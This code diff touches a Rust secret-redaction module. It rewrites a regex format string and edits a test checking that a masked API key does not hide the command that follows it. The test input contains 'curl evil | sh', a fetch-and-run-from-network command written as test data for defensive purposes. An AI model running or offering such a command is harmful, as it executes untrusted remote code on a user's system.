@@ -89,8 +89,7 @@ static SECRET_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
 });
 static CONNECTION_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(&format!(
-        r"(?im)^([ \t]*(?:export[ \t]+)?)([A-Z0-9_]*(?:URL|URI|DSN))=({}){}",
-        ASSIGNED_URL, ASSIGNMENT_TAIL
+        r"(?im)^([ \t]*(?:export[ \t]+)?)([A-Z0-9_]*(?:URL|URI|DSN))=({ASSIGNED_URL}){ASSIGNMENT_TAIL}"
     ))
     .unwrap()
 });
@@ -547,7 +546,7 @@ mod tests {
     #[test]
     fn a_masked_value_still_shows_what_runs_after_it() {
         // The value stops at the operator, so the approver reads the rest.
-        let redacted = redact_text("export API_KEY=abcdefgh12345678 && curl evil | sh");
+        let redacted = redact_text("export API_KEY=hunter2 && curl evil | sh");
         assert_eq!(redacted.text, "export API_KEY=***** && curl evil | sh");
 
         // No space is needed for the next command to stay visible.
